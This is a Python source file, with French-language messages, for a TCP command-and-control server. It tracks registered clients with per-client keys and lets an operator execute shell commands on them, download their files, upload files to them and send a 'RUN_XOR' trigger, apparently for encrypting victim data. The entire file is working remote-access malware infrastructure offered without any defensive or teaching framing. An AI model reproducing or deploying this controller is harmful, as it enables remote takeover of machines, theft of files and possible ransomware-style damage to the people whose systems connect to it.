import os
import socket
import select
import base64
import sys

BUF_SIZE = 4096


def send_line(sock, text):
    try:
        sock.sendall((text + "\n").encode())
    except OSError:
        pass


def accept_hello(line):
    parts = line.strip().split(" ", 2)
    if len(parts) == 3 and parts[0] == "HELLO":
        return parts[1], parts[2]
    return None, None


def save_file(client_id, path, b64_data):
    try:
        data = base64.b64decode(b64_data)
        base = os.path.basename(path) or "file"
        dest_dir = os.path.join("downloads", client_id)
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, base)
        with open(dest, "wb") as f:
            f.write(data)
        print(f"[+] Fichier recu -> {dest}")
    except Exception as exc:
        print(f"[!] Erreur sauvegarde {path}: {exc}")


def push_file(sock, local_path, remote_path):
    try:
        with open(local_path, "rb") as f:
            data = f.read()
        b64_data = base64.b64encode(data).decode()
        send_line(sock, f"DOWNLOAD {remote_path} {b64_data}")
        print(f"[>] Envoi de {local_path} vers client")
    except Exception as exc:
        print(f"[!] Impossible d'ouvrir {local_path}: {exc}")


def main(host="0.0.0.0", port=5000):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen()
    print(f"Serveur lance sur {host}:{port}")

    sockets = [srv, sys.stdin]
    buffers = {}
    client_by_sock = {}
    sock_by_id = {}

    while True:
        readable, _, _ = select.select(sockets, [], [])
        for ready in readable:
            if ready is srv:
                client, addr = srv.accept()
                print(f"[+] Connexion {addr}")
                sockets.append(client)
                buffers[client] = ""
            elif ready is sys.stdin:
                cmd = sys.stdin.readline()
                if not cmd:
                    continue
                cmd = cmd.strip()
                if cmd == "list":
                    for cid, key in sock_by_id.items():
                        print(f"- {cid} key={client_by_sock[sock_by_id[cid]]['key']}")
                    continue
                if cmd.startswith("xor "):
                    cid = cmd.split(" ", 1)[1]
                    sock = sock_by_id.get(cid)
                    if sock:
                        send_line(sock, "RUN_XOR")
                    else:
                        print("[!] Client inconnu")
                    continue
                if cmd.startswith("exec "):
                    parts = cmd.split(" ", 2)
                    if len(parts) < 3:
                        print("Usage: exec <id> <commande>")
                        continue
                    cid, commande = parts[1], parts[2]
                    sock = sock_by_id.get(cid)
                    if sock:
                        send_line(sock, f"EXEC {commande}")
                    else:
                        print("[!] Client inconnu")
                    continue
                if cmd.startswith("get "):
                    parts = cmd.split(" ", 2)
                    if len(parts) < 3:
                        print("Usage: get <id> <chemin_client>")
                        continue
                    cid, path = parts[1], parts[2]
                    sock = sock_by_id.get(cid)
                    if sock:
                        send_line(sock, f"UPLOAD {path}")
                    else:
                        print("[!] Client inconnu")
                    continue
                if cmd.startswith("put "):
                    parts = cmd.split(" ", 3)
                    if len(parts) < 4:
                        print("Usage: put <id> <fichier_local> <destination_client>")
                        continue
                    cid, local_path, remote_path = parts[1], parts[2], parts[3]
                    sock = sock_by_id.get(cid)
                    if sock:
                        push_file(sock, local_path, remote_path)
                    else:
                        print("[!] Client inconnu")
                    continue
                print("Commandes: list | xor <id> | exec <id> <cmd> | get <id> <path> | put <id> <local> <dist>")
            else:
                try:
                    data = ready.recv(BUF_SIZE)
                except OSError:
                    data = b""
                if not data:
                    print("[-] Client ferme")
                    if ready in sockets:
                        sockets.remove(ready)
                    if ready in buffers:
                        buffers.pop(ready, None)
                    if ready in client_by_sock:
                        cid = client_by_sock[ready]["id"]
                        sock_by_id.pop(cid, None)
                        client_by_sock.pop(ready, None)
                    ready.close()
                    continue
                buffers[ready] += data.decode(errors="ignore")
                while "\n" in buffers[ready]:
                    line, buffers[ready] = buffers[ready].split("\n", 1)
                    line = line.strip()
                    if not line:
                        continue
                    if ready not in client_by_sock:
                        cid, key = accept_hello(line)
                        if cid:
                            client_by_sock[ready] = {"id": cid, "key": key}
                            sock_by_id[cid] = ready
                            print(f"[+] Enregistre client {cid}")
                        continue
                    if line.startswith("FILE "):
                        parts = line.split(" ", 2)
                        if len(parts) == 3:
                            path, b64_data = parts[1], parts[2]
                            cid = client_by_sock[ready]["id"]
                            save_file(cid, path, b64_data)
                        continue
                    if line.startswith("OUTPUT "):
                        b64_data = line[7:]
                        try:
                            text = base64.b64decode(b64_data).decode(errors="ignore")
                        except Exception:
                            text = "decode_error"
                        print(f"[R] {text}")
                        continue
                    if line.startswith("LOG "):
                        print(f"[LOG] {line[4:]}")
                        continue
                    if line.startswith("ERROR "):
                        print(f"[!] {line}")
                        continue
                    print(f"[?] {line}")


if __name__ == "__main__":
    h = "0.0.0.0"
    p = 5000
    if len(sys.argv) >= 2:
        h = sys.argv[1]
    if len(sys.argv) >= 3:
        p = int(sys.argv[2])
    main(h, p)
